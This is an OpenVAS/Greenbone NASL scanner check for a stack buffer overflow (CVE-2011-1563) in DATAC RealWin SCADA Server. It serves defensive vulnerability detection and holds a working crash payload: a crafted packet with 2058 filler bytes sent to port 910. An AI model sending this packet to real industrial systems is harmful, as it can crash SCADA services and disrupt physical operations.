# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902528");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_cve_id("CVE-2011-1563");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/43848");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46937");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17417/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/realwin_5-adv.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(910);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code in the context of the application. Failed exploit attempts will
cause a denial-of-service condition.");
  script_tag(name:"affected", value:"DATAC RealFlex RealWin 2.1 (Build 6.1.10.10) and prior.");
  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing various
On_FC_BINFILE_FCS_*FILE packets, which can be exploited to cause a stack
based buffer overflow by sending specially crafted packets to port 910.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"DATAC RealWin SCADA Server is prone to a buffer overflow vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## Default Port
port = 910;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

banner = recv(socket:soc, length:100);
if(banner !~ '^\x10\x23\x54\x67\x00'){
  exit(0);
}

head = raw_string(0x10, 0x23, 0x54, 0x67, 0x24, 0x08, 0x00, 0x00,
                  0x01, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xff, 0xff,
                  0x00, 0x00);

junk = crap(data:"a", length:2058);

tail = raw_string(0x00, 0x35, 0x1c, 0x45, 0x54, 0x01, 0x00, 0x00,
                  0x40, 0x00, 0x02, 0x00, 0x00, 0x00);

## Sending Exploit
send(socket:soc, data: head + junk + tail);
close(soc);

sleep(5);

soc = open_sock_tcp(port);
if(!soc){
 security_message(port);
}
